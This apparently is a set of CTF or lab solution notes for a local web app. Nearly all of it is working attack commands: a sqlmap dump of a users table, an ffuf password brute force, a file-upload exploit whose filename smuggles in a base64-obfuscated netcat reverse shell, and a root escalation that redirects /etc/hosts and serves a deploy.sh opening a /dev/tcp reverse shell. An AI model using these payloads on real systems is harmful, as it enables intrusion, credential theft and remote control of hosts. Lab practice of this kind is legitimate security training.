# Search -> SQL injection
sqlmap -u http://127.0.0.1:5000/?search=* -T users --dump

# Bruteforce password
ffuf -u 'http://127.0.0.1:5000/login' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt -fr "Wrong"

# File upload -> Reverse shell (port 5001)
```bash
Obtain session cookie when logged in as admin

nc -lvnp 5001

Set session=<session cookie>
CMD="echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEyNy4wLjAuMSA1MDAxID4vdG1wL2Y=' | base64 -d | sh" && curl -X POST http://127.0.0.1:5000/upload  -b "session=" -H 'Content-Type: multipart/form-data; boundary=----x'   --data-binary "$(printf '%b' "------x\rContent-Disposition: form-data; name=\"product_id\"\r\r1\r------x\rContent-Disposition: form-data; name=\"image\"; filename=\"X.jpg || $CMD #\"\rContent-Type: image/png\r\r\r------x--\r")"
```

# Initial privilege escalation
python3 backup.py

# Root privilege escalation
Change /etc/hosts script-server current IP to 127.0.0.1

nc -lvnp 5001

Create a deploy.sh file > sh -i >& /dev/tcp/127.0.0.1/5001 0>&1

Serve the file through http 
python3 -m http.server 80